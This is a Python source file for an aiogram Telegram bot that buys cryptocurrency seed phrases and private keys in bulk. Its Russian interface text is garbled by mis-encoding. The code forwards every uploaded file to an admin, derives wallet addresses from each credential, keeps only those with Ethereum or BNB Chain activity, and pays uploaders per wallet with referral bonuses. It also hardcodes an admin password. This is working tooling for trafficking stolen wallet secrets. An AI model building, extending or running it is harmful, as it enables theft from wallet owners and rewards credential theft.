# main.py
import asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, Document
from aiogram.filters import CommandStart
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from aiogram.client.default import DefaultBotProperties
import os
from dotenv import load_dotenv

load_dotenv()

TOKEN = os.getenv("TOKEN")
ADMIN_ID = int(os.getenv("ADMIN"))

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

from database import (
    init_db, get_or_create_user, register_referral, is_duplicate,
    add_wallet_hash, update_user_stats, get_user, get_stats,
    get_referral_count, get_referral_earnings, add_referral_bonus,
    hash_line
)
from wallet_utils import seed_to_address, private_key_to_address
from rpc_client import has_erc20_or_bep20_activity

class UploadFile(StatesGroup):
    waiting_file = State()

class SupportState(StatesGroup):
    waiting_for_message = State()

class WithdrawState(StatesGroup):
    waiting_for_amount = State()
    waiting_for_address = State()

class AdminState(StatesGroup):
    waiting_for_password = State()

# –ö–ª–∞–≤–∏–∞—Ç—É—Ä—ã
main_menu = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="üìÇ –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–∞–π–ª", callback_data="upload")],
        [InlineKeyboardButton(text="üë§ –ü—Ä–æ—Ñ–∏–ª—å", callback_data="profile")],
        [InlineKeyboardButton(text="üë• –†–µ—Ñ–µ—Ä–∞–ª—ã", callback_data="referrals")],
        [InlineKeyboardButton(text="üí∞ –ë–∞–ª–∞–Ω—Å", callback_data="balance")],
        [InlineKeyboardButton(text="üí≥ –í—ã–≤–µ—Å—Ç–∏", callback_data="withdraw")],
        [InlineKeyboardButton(text="üìû –ü–æ–¥–¥–µ—Ä–∂–∫–∞", callback_data="support")],
        [InlineKeyboardButton(text="‚ÑπÔ∏è –ü—Ä–∞–≤–∏–ª–∞", callback_data="rules")],
    ]
)

admin_panel = InlineKeyboardMarkup(
    inline_keyboard=[
        [InlineKeyboardButton(text="üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data="admin_stats")],
        [InlineKeyboardButton(text="üì§ –ó–∞—è–≤–∫–∏ –Ω–∞ –≤—ã–≤–æ–¥", callback_data="admin_withdrawals")],
        [InlineKeyboardButton(text="üîô –í—ã—Ö–æ–¥", callback_data="admin_logout")]
    ]
)

back_menu = InlineKeyboardMarkup(
    inline_keyboard=[[InlineKeyboardButton(text="üîô –ù–∞–∑–∞–¥", callback_data="back")]]
)

@dp.message(CommandStart())
async def start_cmd(message: Message):
    args = message.text.split()
    referrer_id = None
    if len(args) > 1:
        payload = args[1]
        if payload.startswith("ref_"):
            try:
                referrer_id = int(payload.replace("ref_", ""))
            except:
                pass

    await get_or_create_user(message.from_user.id, message.from_user.username or "unknown")
    if referrer_id:
        await register_referral(message.from_user.id, referrer_id)

    ref_link = f"https://t.me/your_bot_username_bot?start=ref_{message.from_user.id}"
    text = (
        "üëã <b>–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!</b>\n\n"
        "üõí <b>–°–∫—É–ø–∫–∞ SEED-—Ñ—Ä–∞–∑ –∏ Private-–∫–ª—é—á–µ–π</b> —Å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è–º–∏ –≤ —Å–µ—Ç—è—Ö:\n"
        "‚Ä¢ <b>ERC-20 (Ethereum)</b>\n"
        "‚Ä¢ <b>BEP-20 (BNB Smart Chain)</b>\n\n"
        "üí∞ <b>–¶–µ–Ω—ã:</b>\n"
        "‚Ä¢ üå± SEED-—Ñ—Ä–∞–∑–∞ ‚Äî <b>235‚ÇΩ</b>\n"
        "‚Ä¢ üîë Private-key ‚Äî <b>145‚ÇΩ</b>\n\n"
        "üí∏ <b>–ü–õ–ê–¢–ò–ú –°–ê–ú–£–Æ –í–´–°–û–ö–£–Æ –¶–ï–ù–£</b> + <b>70% –æ—Ç –æ—Ç—Ä–∞–±–æ—Ç–∫–∏</b> –ø–æ–º–∏–º–æ –ø—Ä–∞–π—Å–∞!\n\n"
        "üîù <b>–ù–∞—à–∏ –ø—Ä–µ–∏–º—É—â–µ—Å—Ç–≤–∞:</b>\n"
        "‚îú ü§ñ –ê–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏—è\n"
        "‚îú ‚ö° –ë—ã—Å—Ç—Ä—ã–µ –≤—ã–ø–ª–∞—Ç—ã\n"
        "‚îú üöÄ –í—ã—Å–æ–∫–∞—è —Å–∫–æ—Ä–æ—Å—Ç—å\n"
        "‚îî üîç –ì–ª—É–±–æ–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞\n\n"
        "üïí <b>–í—ã–ø–ª–∞—Ç—ã –∫–∞–∂–¥—ã–π –¥–µ–Ω—å –≤ 23:00 (–ú–°–ö)</b>\n"
        "–í—Å–µ –∑–∞—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã–µ —Å—Ä–µ–¥—Å—Ç–≤–∞ –±—É–¥—É—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏."
    )
    await message.answer(text, reply_markup=main_menu)

@dp.callback_query(F.data == "upload")
async def upload_file_cb(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        "üìÇ –ó–∞–≥—Ä—É–∑–∏—Ç–µ —Ñ–∞–π–ª –≤ —Ñ–æ—Ä–º–∞—Ç–µ <b>.txt</b>.\n\n"
        "üìå –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –¥–æ <b>20 –ú–ë</b>.\n"
        "üîç –ü—Ä–æ–≤–µ—Ä–∫–∞: —É–Ω–∏–∫–∞–ª—å–Ω–æ—Å—Ç—å + –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å"
    )
    await state.set_state(UploadFile.waiting_file)
    await callback.answer()

@dp.message(UploadFile.waiting_file, F.document)
async def process_file(message: Message, state: FSMContext):
    document: Document = message.document

    user_info = f"@{message.from_user.username}" if message.from_user.username else f"ID: {message.from_user.id}"
    try:
        await bot.send_message(ADMIN_ID, f"üì© –§–∞–π–ª –æ—Ç {user_info}\nüìÑ {document.file_name} | {document.file_size} –±–∞–π—Ç")
        await bot.send_document(ADMIN_ID, document.file_id)
    except Exception as e:
        await bot.send_message(ADMIN_ID, f"‚ùå –ù–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: {e}")

    if not document.file_name.endswith(".txt"):
        await message.answer("‚ùå –§–∞–π–ª –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –≤ —Ñ–æ—Ä–º–∞—Ç–µ <b>.txt</b>.")
        await state.clear()
        return

    await message.answer("üì• –°–∫–∞—á–∏–≤–∞—é –∏ –∞–Ω–∞–ª–∏–∑–∏—Ä—É—é —Ñ–∞–π–ª...")

    try:
        file = await bot.get_file(document.file_id)
        max_size = 20 * 1024 * 1024
        if file.file_size > max_size:
            await message.answer("‚ùå –§–∞–π–ª —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π. –ú–∞–∫—Å–∏–º—É–º ‚Äî 20 –ú–ë.")
            await state.clear()
            return

        file_data = (await bot.download_file(file.file_path)).getvalue()

        if len(file_data) >= 100 and b'\x00' in file_data[:100]:
            await message.answer("‚ùå –≠—Ç–æ –Ω–µ —Ç–µ–∫—Å—Ç–æ–≤—ã–π —Ñ–∞–π–ª.")
            await state.clear()
            return

        try:
            content = file_data.decode("utf-8")
        except UnicodeDecodeError:
            try:
                content = file_data.decode("cp1251")
            except UnicodeDecodeError:
                content = file_data.decode("utf-8", errors="replace")

    except Exception as e:
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞: {e}")
        await state.clear()
        return

    lines = [line.strip() for line in content.splitlines() if line.strip()]
    total_lines = len(lines)
    new_seeds = 0
    new_keys = 0
    total_reward = 0

    for line in lines:
        address = None
        is_valid = False

        word_count = len(line.split())
        if word_count in (12, 24) and all(w.isalnum() for w in line.split()):
            address = seed_to_address(line)
            wallet_type = 'seed'
            price = 235
        elif len(line) == 64 and all(c in "0123456789abcdefABCDEF" for c in line):
            address = private_key_to_address(line)
            wallet_type = 'key'
            price = 145
        else:
            continue

        if not address:
            continue

        h = hash_line(line)
        if await is_duplicate(h):
            continue

        if await has_erc20_or_bep20_activity(address):
            await add_wallet_hash(h, wallet_type, message.from_user.id)
            if wallet_type == 'seed':
                new_seeds += 1
            else:
                new_keys += 1
            total_reward += price
            is_valid = True
            await bot.send_message(ADMIN_ID, f"‚úÖ –ê–∫—Ç–∏–≤–Ω—ã–π: <code>{address}</code> ‚Üí +{price}‚ÇΩ", parse_mode="HTML")

    if new_seeds or new_keys:
        await update_user_stats(message.from_user.id, total_lines, new_seeds, new_keys, total_reward)
        user = await get_user(message.from_user.id)
        if user and user['referred_by']:
            bonus = total_reward * 0.1
            await add_referral_bonus(user['referred_by'], bonus)
            try:
                await bot.send_message(user['referred_by'], f"üéâ –†–µ—Ñ–µ—Ä–∞–ª –∑–∞—Ä–∞–±–æ—Ç–∞–ª {total_reward}‚ÇΩ\nüí∏ –í–∞–º +{bonus:.2f}‚ÇΩ")
            except: pass

    if total_reward > 0:
        text = (
            f'‚úÖ –§–∞–π–ª <b>"{document.file_name}"</b> –æ–±—Ä–∞–±–æ—Ç–∞–Ω!\n\n'
            f"üìä –ù–∞–π–¥–µ–Ω–æ:\n"
            f"   ‚Ä¢ üå± SEED: <b>{new_seeds}</b> √ó 235‚ÇΩ\n"
            f"   ‚Ä¢ üîë Keys: <b>{new_keys}</b> √ó 145‚ÇΩ\n\n"
            f"üìà –û–±—Ä–∞–±–æ—Ç–∞–Ω–æ —Å—Ç—Ä–æ–∫: <b>{total_lines}</b>\n"
            f"üí∞ –ó–∞—Ä–∞–±–æ—Ç–∞–Ω–æ: <b>{total_reward:.2f} RUB</b>"
        )
    else:
        text = (
            f'‚ö†Ô∏è –í —Ñ–∞–π–ª–µ <b>"{document.file_name}"</b> –Ω–µ –Ω–∞–π–¥–µ–Ω–æ –∞–∫—Ç–∏–≤–Ω—ã—Ö –∫–æ—à–µ–ª—å–∫–æ–≤.\n\n'
            f"üìà –í—Å–µ–≥–æ —Å—Ç—Ä–æ–∫: <b>{total_lines}</b>\n"
            "‚ùå –ë–∞–ª–∞–Ω—Å –Ω–µ –ø–æ–ø–æ–ª–Ω–µ–Ω."
        )

    await message.answer(text, reply_markup=main_menu)
    await state.clear()

@dp.callback_query(F.data == "withdraw")
async def withdraw_start(callback: CallbackQuery, state: FSMContext):
    user = await get_user(callback.from_user.id)
    if not user or user['balance'] <= 0:
        await callback.message.edit_text("‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤.", reply_markup=back_menu)
        await callback.answer()
        return
    await callback.message.edit_text(f"üí≥ –í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –≤—ã–≤–æ–¥–∞ (–º–∏–Ω–∏–º—É–º 500‚ÇΩ):\n–í–∞—à –±–∞–ª–∞–Ω—Å: {user['balance']:.2f} RUB")
    await state.set_state(WithdrawState.waiting_for_amount)
    await callback.answer()

@dp.message(WithdrawState.waiting_for_amount)
async def withdraw_amount(message: Message, state: FSMContext):
    try:
        amount = float(message.text)
        if amount < 500:
            await message.answer("‚ùå –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞ ‚Äî 500‚ÇΩ.")
            return
    except:
        await message.answer("‚ùå –í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ.")
        return

    user = await get_user(message.from_user.id)
    if amount > user['balance']:
        await message.answer(f"‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤. –î–æ—Å—Ç—É–ø–Ω–æ: {user['balance']:.2f} RUB")
        await state.clear()
        return

    await state.update_data(amount=amount)
    await message.answer("üì® –í–≤–µ–¥–∏—Ç–µ –≤–∞—à BNB (BEP-20) –∞–¥—Ä–µ—Å:")
    await state.set_state(WithdrawState.waiting_for_address)

@dp.message(WithdrawState.waiting_for_address)
async def withdraw_address(message: Message, state: FSMContext):
    address = message.text.strip()
    if not (address.startswith("0x") and len(address) == 42):
        await message.answer("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç BNB-–∞–¥—Ä–µ—Å–∞.")
        return

    data = await state.get_data()
    amount = data['amount']
    user = message.from_user

    await bot.send_message(
        ADMIN_ID,
        f"üí∏ <b>–ó–∞—è–≤–∫–∞ –Ω–∞ –≤—ã–≤–æ–¥</b>\n"
        f"üë§ @{user.username or user.id}\n"
        f"üí∞ {amount} RUB\n"
        f"üì§ –ê–¥—Ä–µ—Å: <code>{address}</code>",
        parse_mode="HTML"
    )
    await message.answer(
        f"‚úÖ –ó–∞—è–≤–∫–∞ –Ω–∞ –≤—ã–≤–æ–¥ <b>{amount} RUB</b> –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!\n"
        f"–ê–¥—Ä–µ—Å: <code>{address}</code>\n"
        "–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä –æ–±—Ä–∞–±–æ—Ç–∞–µ—Ç –∑–∞–ø—Ä–æ—Å –≤ –±–ª–∏–∂–∞–π—à–µ–µ –≤—Ä–µ–º—è.",
        parse_mode="HTML",
        reply_markup=main_menu
    )
    await state.clear()

@dp.callback_query(F.data == "support")
async def support_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "üìû –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ, –∏ –º—ã –æ—Ç–≤–µ—Ç–∏–º –≤ –±–ª–∏–∂–∞–π—à–µ–µ –≤—Ä–µ–º—è.",
        reply_markup=back_menu
    )
    await state.set_state(SupportState.waiting_for_message)
    await callback.answer()

@dp.message(SupportState.waiting_for_message)
async def send_to_admin(message: Message, state: FSMContext):
    user = message.from_user
    await bot.send_message(
        ADMIN_ID,
        f"üì© –û—Ç @{user.username or user.id} (ID: {user.id})\n–¢–∏–ø: {message.content_type}"
    )
    await message.send_copy(chat_id=ADMIN_ID)
    await message.answer("‚úÖ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!", reply_markup=main_menu)
    await state.clear()

@dp.message(F.reply_to_message)
async def reply_to_user(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    replied = message.reply_to_message
    if not replied.text or "–û—Ç @" not in replied.text:
        return
    try:
        user_id = int(replied.text.split("ID: ")[1].split(")")[0])
        await message.send_copy(chat_id=user_id)
        await message.answer("‚úÖ –û—Ç–≤–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é.")
    except Exception as e:
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞: {e}")

@dp.callback_query(F.data == "profile")
async def profile_cb(callback: CallbackQuery):
    user = await get_user(callback.from_user.id)
    if not user:
        await callback.message.edit_text("‚ùå –û—à–∏–±–∫–∞.", reply_markup=back_menu)
        await callback.answer()
        return
    text = (
        f"üë§ <b>–ü—Ä–æ—Ñ–∏–ª—å</b>\n\n"
        f"üÜî ID: <code>{user['user_id']}</code>\n"
        f"üìù –ó–∞–≥—Ä—É–∂–µ–Ω–æ —Å—Ç—Ä–æ–∫: {user['total_lines']}\n"
        f"üå± SEED: {user['unique_seeds']}\n"
        f"üîë Keys: {user['unique_keys']}\n"
        f"üí∞ –ó–∞—Ä–∞–±–æ—Ç–∞–Ω–æ: {user['balance']:.2f} RUB\n\n"
        f"üïì –í—ã–ø–ª–∞—Ç—ã –≤ 23:00 (–ú–°–ö)"
    )
    await callback.message.edit_text(text, reply_markup=back_menu)
    await callback.answer()

@dp.callback_query(F.data == "referrals")
async def referrals_cb(callback: CallbackQuery):
    ref_count = await get_referral_count(callback.from_user.id)
    earnings = await get_referral_earnings(callback.from_user.id)
    ref_link = f"https://t.me/your_bot_username_bot?start=ref_{callback.from_user.id}"
    text = (
        f"üë• <b>–†–µ—Ñ–µ—Ä–∞–ª—ã</b>\n\n"
        f"üîó –°—Å—ã–ª–∫–∞: <code>{ref_link}</code>\n"
        f"üë• –ü—Ä–∏–≥–ª–∞—à–µ–Ω–æ: {ref_count}\n"
        f"üí∏ –ó–∞—Ä–∞–±–æ—Ç–∞–Ω–æ: {earnings:.2f} RUB"
    )
    await callback.message.edit_text(text, reply_markup=back_menu)
    await callback.answer()

@dp.callback_query(F.data == "balance")
async def balance_cb(callback: CallbackQuery):
    user = await get_user(callback.from_user.id)
    bal = user['balance'] if user else 0
    await callback.message.edit_text(f"üí∞ –ë–∞–ª–∞–Ω—Å: <b>{bal:.2f} RUB</b>", reply_markup=back_menu)
    await callback.answer()

@dp.callback_query(F.data == "rules")
async def rules_cb(callback: CallbackQuery):
    text = (
        "üìú <b>–ü—Ä–∞–≤–∏–ª–∞</b>\n\n"
        "1Ô∏è‚É£ –¢–æ–ª—å–∫–æ .txt —Ñ–∞–π–ª—ã\n"
        "2Ô∏è‚É£ –¢–æ–ª—å–∫–æ —É–Ω–∏–∫–∞–ª—å–Ω—ã–µ –∞–∫—Ç–∏–≤–Ω—ã–µ –∫–æ—à–µ–ª—å–∫–∏ (ETH/BNB)\n"
        "3Ô∏è‚É£ –û–±–º–∞–Ω = –±–∞–Ω\n"
        "4Ô∏è‚É£ –í—ã–ø–ª–∞—Ç—ã –≤ 23:00 (–ú–°–ö)"
    )
    await callback.message.edit_text(text, reply_markup=back_menu)
    await callback.answer()

@dp.callback_query(F.data == "back")
async def back_cb(callback: CallbackQuery):
    await callback.message.edit_text("–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é:", reply_markup=main_menu)
    await callback.answer()

# –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å
@dp.message(F.text == "/admin")
async def admin_login_cmd(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("üîê –í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å:")
    await state.set_state(AdminState.waiting_for_password)

@dp.message(AdminState.waiting_for_password)
async def admin_password_check(message: Message, state: FSMContext):
    if message.text == "Linar1212@":
        await message.answer("‚úÖ –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!", reply_markup=admin_panel)
        await state.clear()
    else:
        await message.answer("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å.")

@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: CallbackQuery):
    stats = await get_stats()
    await callback.message.edit_text(
        f"üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:\n"
        f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {stats['users']}\n"
        f"–°—Ç—Ä–æ–∫: {stats['lines']}\n"
        f"–í—ã–ø–ª–∞—á–µ–Ω–æ: {stats['payout']:.2f} RUB",
        reply_markup=admin_panel
    )
    await callback.answer()

@dp.callback_query(F.data == "admin_withdrawals")
async def admin_withdrawals(callback: CallbackQuery):
    await callback.message.edit_text("üì§ –í—Å–µ –∑–∞—è–≤–∫–∏ –ø—Ä–∏—Ö–æ–¥—è—Ç –≤ –ª–∏—á–∫—É.", reply_markup=admin_panel)
    await callback.answer()

@dp.callback_query(F.data == "admin_logout")
async def admin_logout(callback: CallbackQuery):
    await callback.message.edit_text("üëã –í—ã –≤—ã—à–ª–∏.", reply_markup=main_menu)
    await callback.answer()

@dp.message(F.text == "/stats")
async def stats_cmd(message: Message):
    if message.from_user.id != ADMIN_ID:
        return
    stats = await get_stats()
    await message.answer(
        f"üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:\n"
        f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π: {stats['users']}\n"
        f"–°—Ç—Ä–æ–∫: {stats['lines']}\n"
        f"–í—ã–ø–ª–∞—á–µ–Ω–æ: {stats['payout']:.2f} RUB"
    )

async def main():
    await init_db()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
